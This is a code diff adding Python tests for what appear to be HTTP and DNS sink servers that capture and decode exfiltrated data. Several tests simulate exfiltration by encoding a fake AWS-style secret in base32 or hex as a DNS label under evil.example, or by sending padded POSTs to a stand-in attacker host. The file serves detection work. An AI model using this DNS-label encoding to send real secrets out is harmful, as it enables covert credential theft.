@@ -523,3 +523,115 @@ def test_log_write_failure_kills_the_sink(tmp_path: Path, script):
             process.kill()
             process.wait(timeout=SINK_TIMEOUT)
         reader.join(timeout=SINK_TIMEOUT)
+
+
+class SegmentedConn:
+    """recv() returns at most one queued segment per call, like a paused sender."""
+
+    def __init__(self, segments: list[bytes]):
+        self._segments = [bytearray(segment) for segment in segments]
+        self.consumed = 0
+
+    def recv(self, size: int) -> bytes:
+        while self._segments and not self._segments[0]:
+            self._segments.pop(0)
+        if not self._segments:
+            return b""
+        chunk = bytes(self._segments[0][:size])
+        del self._segments[0][: len(chunk)]
+        self.consumed += len(chunk)
+        return chunk
+
+
+def padded_head(target: int) -> bytes:
+    lines = [
+        b"POST /big HTTP/1.1",
+        b"Host: big.evil.example",
+        b"X-Pad: ",
+        b"Content-Length: 5000",
+    ]
+    pad = target - len(b"\r\n".join(lines) + b"\r\n\r\n")
+    assert pad >= 0
+    lines[2] = b"X-Pad: " + b"x" * pad
+    head = b"\r\n".join(lines) + b"\r\n\r\n"
+    assert len(head) == target
+    return head
+
+
+def test_sink_stop_tolerates_a_tracked_but_unstarted_worker():
+    module = load_sink_module("http_sink.py")
+    sink = module.Sink(None)
+    sink._threads.add(threading.Thread(target=lambda: None))
+    assert sink.stop() is True
+
+
+def test_read_head_applies_the_limit_to_the_head_not_coalesced_body_bytes():
+    module = load_sink_module("http_sink.py")
+    full = padded_head(32_000)
+    body = b"B" * 5000
+    conn = SegmentedConn([full[:31_000], full[31_000:] + body])
+    head, raw = module.read_head(conn)
+    assert raw is None
+    assert head is not None
+    assert len(head[0]) + len(head[1]) == 32_000
+    assert head[0].startswith(b"POST /big HTTP/1.1\r\nHost: big.evil.example\r\n")
+    assert head[2] == body[: len(head[2])]
+    assert len(head[2]) == 4096 - (32_000 - 31_000)
+
+
+def test_read_head_stays_bounded_when_the_head_exceeds_the_limit():
+    module = load_sink_module("http_sink.py")
+    full = padded_head(module.HEAD_LIMIT + 1000)
+    conn = SegmentedConn([full + b"B" * 5000])
+    head, raw = module.read_head(conn)
+    assert head is None
+    assert raw is not None
+    assert len(raw) <= module.HEAD_LIMIT + 4096
+    assert conn.consumed <= module.HEAD_LIMIT + 4096
+
+
+def test_decode_label_recovers_lower_and_mixed_case_base32():
+    module = load_sink_module("dns_sink.py")
+    secret = "AKIA-FAKE-SECRET"
+    upper = base64.b32encode(secret.encode()).decode().rstrip("=")
+    mixed = "".join(ch.lower() if index % 2 else ch for index, ch in enumerate(upper))
+    # DNS names are case-insensitive and resolvers may randomize case (0x20).
+    for label in (upper, upper.lower(), mixed):
+        entries = module.decode_label(label)
+        assert any(
+            entry["encoding"] == "base32" and entry["text"] == secret for entry in entries
+        ), label
+
+
+def test_decode_label_hex_accepts_any_case():
+    module = load_sink_module("dns_sink.py")
+    secret = "send-help"
+    upper = secret.encode().hex().upper()
+    mixed = "".join(ch.lower() if index % 2 else ch for index, ch in enumerate(upper))
+    for label in (upper, upper.lower(), mixed):
+        entries = module.decode_label(label)
+        assert any(entry["encoding"] == "hex" and entry["text"] == secret for entry in entries), (
+            label
+        )
+
+
+def test_decode_label_base64_stays_case_sensitive():
+    module = load_sink_module("dns_sink.py")
+    secret = "bw-fake-credential-0123456789"
+    label = base64.b64encode(secret.encode()).decode().rstrip("=")
+    assert any(entry["text"] == secret for entry in module.decode_label(label))
+    # A 0x20-style case flip must not make base64 decode to the same secret.
+    assert all(entry["text"] != secret for entry in module.decode_label(label.lower()))
+
+
+def test_dns_decodes_lowercase_base32_label(dns_sink):
+    secret = "AKIA-FAKE-SECRET"
+    label = base64.b32encode(secret.encode()).decode().rstrip("=").lower()
+    qname = f"{label}.evil.example"
+    dns_query(dns_sink["port"], qname)
+    hit = next(
+        record for record in read_records(dns_sink["log"], "dns") if record["qname"] == qname
+    )
+    assert any(
+        entry["encoding"] == "base32" and entry["text"] == secret for entry in hit["decoded"]
+    )
